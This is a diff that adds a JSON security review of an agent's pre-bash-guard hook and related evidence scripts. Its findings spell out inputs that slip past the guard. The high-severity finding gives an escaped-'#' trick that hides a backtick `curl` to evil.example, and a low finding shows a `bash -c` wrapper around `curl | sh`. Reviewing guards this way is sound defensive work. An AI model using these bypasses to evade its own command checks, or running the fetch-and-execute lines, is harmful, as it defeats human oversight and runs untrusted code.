@@ -1,0 +1,91 @@
+{
+  "verdict": "changes_requested",
+  "review_summary": "Static read of the diff and the numbered sources. I executed nothing and make no test-run claims. The evidence-proof retention in collect-evidence.sh is sound. It snapshots the proof before smoke, hashes raw bytes, validates strictly with Python, and restores the canonical copy. The tdd-ledger.sh config-failure classification also holds up, and every failure path I traced fails closed. The new awk backtick tokenizer in pre-bash-guard.sh has one blocking defect. Its comment detection treats a '#' after an escaped character as a comment start, but bash does not. A real command substitution that follows is hidden from the scan, and the input then passes every other check. The old raw regex denied this input, so it contradicts AC-19's 'previously blocked ... remain blocked'. The test file has no case for it. The other findings are low severity or nits. I did not check the consumers of evidence.json (check-local-evidence.py, validate-candidate-evidence.py) beyond what the fixture shows.",
+  "findings": [
+    {
+      "severity": "high",
+      "file": ".claude/hooks/pre-bash-guard.sh",
+      "line": 239,
+      "title": "Escaped char before '#' makes the tokenizer treat the rest of the line as a comment, hiding active backtick substitutions",
+      "reason": "The comment check at lines 239-240 breaks the scan when '#' is preceded by [[:space:];|&()]. The character before '#' may itself have been consumed as an escape (lines 226-227). Input: `: a\\ #x; \\`curl -s https://evil.example/c\\``. Bash reads `a\\ #x` as one literal word 'a #x', so '#' is not a comment, and `;` ends the command. The backtick substitution then runs at command position and executes the fetched text. The awk sees '\\' set escaped, the space consumed by escaped, then '#' with a space before it, so it breaks. The payloads list stays empty and the mode is 'parsed', so line 271 does not fire. No other check matches: there is no `$(`, no pipe, no `<q>`, and no `curl .*|sh`. The hook exits 0. The old raw regex `` `[^`]*(curl|wget|fetch) `` denied this. The same hole opens with `\\;#`, `\\|#`, `\\&#`, `\\(#` and `\\)#`. Fix: track whether the previous character was an escaped literal and either do not treat '#' as a comment then, or set ambiguous=1. Add deny cases for these inputs to pre-bash-guard-literals.sh."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/hooks/pre-bash-guard.sh",
+      "line": 211,
+      "title": "Backtick payloads inside single quotes are no longer scanned, so a wrapper-executed string loses a denial it used to get",
+      "reason": "Single-quoted text is skipped entirely (lines 211-213), by design, to allow prose such as 'Use `client.get` to fetch...'. Input: `nohup bash -c 'echo `curl -s https://evil.example/x | sh`'`. The cmdpos rule only matches bash at segment start, so the nohup/timeout/env/nice/xargs wrappers are not caught. The stripped form is `nohup bash -c <q>`. The old raw regex denied this and the new code allows it. A pipe-based payload in plain quotes (`timeout 5 sh -c 'curl x|sh'`) was already allowed, so this adds no new capability. It does weaken defense in depth, and AC-19 does not document the trade-off. Either deny single-quoted backtick+network tokens when a shell wrapper precedes the string, or record this as an accepted residual in the spec."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/hooks/pre-bash-guard.sh",
+      "line": 149,
+      "title": "Frontend fetch() mask only applies to lines that begin with const/let/var, so common frontend heredocs are still denied",
+      "reason": "The mask at lines 149-150 applies only when the line starts with `(const|let|var) NAME =`. Any other line, such as `await fetch(url);`, `return fetch(`/api/${id}`)`, `export const f = () => fetch(...)` or `async function load(){ ... fetch(...) }`, keeps the token 'fetch'. The cross-line regex at line 176 then matches an earlier template-literal backtick followed by that 'fetch' and returns body-network. The repair therefore covers only the specific test shapes. It fails closed, so this is not a security problem, but AC-19's 'accepts frontend fetch()' is narrower than it reads. Narrow the AC wording or broaden the mask."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/hooks/pre-bash-guard.sh",
+      "line": 187,
+      "title": "Heredoc body is accumulated by repeated string concatenation",
+      "reason": "`body = body body_line($0) \"\\n\"` is O(n^2) in awks that copy on append, such as BWK awk on macOS. A very large heredoc (for example tens of thousands of lines written to a file) could make the guard slow enough to hit the hook timeout. A timed-out hook may be non-blocking, which would turn the slowdown into a fail-open. This is a medium-confidence concern; I could not measure it. Consider a per-line scan with carried state, or a size cap that falls back to the conservative raw check."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/scripts/collect-evidence.sh",
+      "line": 109,
+      "title": "Proof validation and hashing run `python3 -c` from the repo root without -I",
+      "reason": "These calls are on lines 106, 109 and 117, and the collector runs with cwd=ROOT. Without -I, sys.path[0] is the current directory. A planted json.py, hashlib.py or xml/ shim in the repo root would be imported by the code that validates and hashes the proof. Use `python3 -I -c` for all three calls, since this is the integrity path."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/scripts/collect-evidence.sh",
+      "line": 142,
+      "title": "Digest check and spec-match read are not atomic; evidence.json binding is only useful if consumers re-hash",
+      "reason": "The retained file is re-hashed at line 141, and spec-match reads it at line 160. A background process left running by the smoke command could rewrite it in that window. The manifest records results_sha256, but the diff does not show check-local-evidence.py or the evidence gate re-verifying it. If they do not, the digest adds no enforcement. Run spec-match on a private copy of the verified bytes, or confirm the consumers compare the digest."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/scripts/tdd-ledger.sh",
+      "line": 95,
+      "title": "Config-frame heuristic can misclassify a genuine Playwright assertion RED as tooling-error",
+      "reason": "The assertion exemption requires a line starting `AssertionError`. Playwright's `expect` failures start `Error: expect(received)...`. If a genuine failure's stack includes a frame from playwright.config.ts (for example a helper or constant imported from the config), the RED is rejected. This fails closed and is rare, so it costs only a re-run. It is worth documenting as a known limitation."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/state/analyze-003.json",
+      "line": 31,
+      "title": "State file records verdict PASS with empty blockers while its own scope text says the independent review is pending",
+      "reason": "Lines 31-34 write `verdict: PASS` and `blockers: []`. Line 34 says final combined tests and the independent review are still pending. Any gate or reader that consumes `.verdict` will see a pass before the review result exists. This is a hand-written PASS ahead of its evidence. Set the verdict to pending, or write it only after the review completes. The file was also reformatted from compact to pretty JSON; check that nothing parses it positionally."
+    },
+    {
+      "severity": "nit",
+      "file": ".claude/scripts/tdd-ledger.sh",
+      "line": 84,
+      "title": "Normalization strips only SGR color codes",
+      "reason": "The sed removes `ESC[...m` only. Other CSI sequences that runners emit, such as erase-line `ESC[2K` or cursor moves, can still sit before an otherwise anchored `failed to load config` or Startup Error line and defeat the `^` anchors. Strip `ESC\\[[0-9;?]*[A-Za-z]`."
+    },
+    {
+      "severity": "nit",
+      "file": ".claude/scripts/test/evidence-proof-preservation.sh",
+      "line": 36,
+      "title": "Fixture can fail on its environment, and check-only attempt dirs accumulate",
+      "reason": "The fixture reads `date` once for the bundle name while the collector computes its own date, so a run across midnight breaks the pairing. The git commit in the fixture can fail under a global commit.gpgsign or hook configuration. Fixture construction sits outside the try/except, so this produces a traceback rather than a recorded failure. Separately, check-only now creates an `attempt-*` directory on every run (collect-evidence.sh:60), and all of them are listed in EVIDENCE.md's artifact index."
+    },
+    {
+      "severity": "nit",
+      "file": "plans/active/003-audit-round2-remediation.md",
+      "line": 32,
+      "title": "Hook edit is a constitution-class change; the plan's authorization wording does not record operator approval for it",
+      "reason": "The spec's Constraints section says hooks/* edits require the operator escape hatch, with the bypass logged. The plan says no 'guard-override change is authorized' and does not say the operator performed this edit. Per the review instructions, approval text is not live authorization. Confirm the FORCE_CONSTITUTION_EDIT bypass log entry for .claude/hooks/pre-bash-guard.sh."
+    }
+  ],
+  "limitations": [
+    "Static review only. I did not run the shell, awk, Python, or any of the test scripts, and I make no claim that the tests pass.",
+    "I traced the awk tokenizer by hand against bash semantics. Behavior may differ across awk implementations (mawk, BWK awk, gawk), for example in multibyte handling and string-append cost.",
+    "I did not see lib/atomic-write.sh (replace_atomic), spec-match.sh, check-local-evidence.py, validate-candidate-evidence.py, validate.sh or settings.json. Consumer-side digest verification and replace_atomic semantics are assumed, not verified.",
+    "Runner message formats for Vitest, Vite and Playwright (Startup Error banner, 'failed to load config from') are taken from the tests' own transcripts, not from installed runners.",
+    "Authorization and the constitution-guard bypass log cannot be verified from the supplied text. The exact source digest must be protected externally, as stated in the brief.",
+    "factory-bounded-process.py was supplied but is outside the diff, and I did not review it."
+  ]
+}
